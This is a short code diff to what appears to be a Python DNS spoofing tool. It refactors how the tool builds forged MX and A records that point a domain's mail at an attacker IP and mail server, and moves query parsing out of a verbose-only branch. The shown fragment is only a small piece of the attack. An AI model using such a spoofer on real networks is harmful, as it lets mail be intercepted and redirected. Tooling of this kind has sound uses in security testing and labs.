@@ -107,9 +107,8 @@ def build_dns_response(query_data, forged_domain, attacker_ip, attacker_mx_name)
         response += mx_answer
         
         # Add additional A record for the MX hostname
-        # Encode MX name
-        additional_name = mx_name_encoded[:-1]  # Remove trailing null
-        additional_name += b'\x00'
+        # Reuse the MX name encoding (already includes trailing null)
+        additional_name = mx_name_encoded
         
         # Type A (1), Class IN (1)
         a_type = struct.pack('>H', 1)
@@ -154,8 +153,10 @@ def run_dns_spoofer(listen_ip='0.0.0.0', listen_port=53, forged_domain='example.
             try:
                 data, addr = sock.recvfrom(512)
                 
+                # Parse query once for efficiency
+                query = DNSQuery(data)
+                
                 if verbose:
-                    query = DNSQuery(data)
                     qtype_name = 'MX' if query.qtype == 15 else f'TYPE{query.qtype}'
                     print(f"[+] Query from {addr[0]}:{addr[1]} - {query.domain} ({qtype_name})")
                 
